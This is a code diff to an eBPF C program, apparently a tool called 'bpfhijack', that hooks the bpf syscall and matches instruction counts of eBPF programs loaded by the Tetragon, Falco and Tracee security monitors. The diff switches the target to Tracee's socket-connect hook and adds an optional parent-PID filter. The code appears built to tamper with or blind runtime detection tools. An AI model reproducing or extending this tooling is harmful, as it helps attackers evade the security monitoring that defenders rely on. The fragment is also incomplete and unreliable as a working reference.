@@ -5,7 +5,12 @@
 #include <bpf/bpf_core_read.h>
 #include "bpfhijack.h"
 
-#define TARGET_BPF_INSNS 15691
+/*
+#define TARGET_BPF_INSNS 15691		// tetragon: process_exec events
+#define TARGET_BPF_INSNS 495 		// falco: execve_x
+#define TARGET_BPF_INSNS 2688		// tracee: security_inode_unlink
+*/
+#define TARGET_BPF_INSNS 1483		// tracee: security_socket_connect
 
 #define BPF_ALU64 0x07
 #define BPF_EXIT 0x95
@@ -25,6 +30,9 @@ struct {
     __uint(type, BPF_MAP_TYPE_RINGBUF);
     __uint(max_entries, 256 * 1024);
 } rb SEC(".maps");
+
+// Optional Target Parent PID
+const volatile int target_ppid = 0;
 
 SEC("tp/syscalls/sys_enter_bpf")
 int handle_bpf_enter(struct trace_event_raw_sys_enter *ctx)
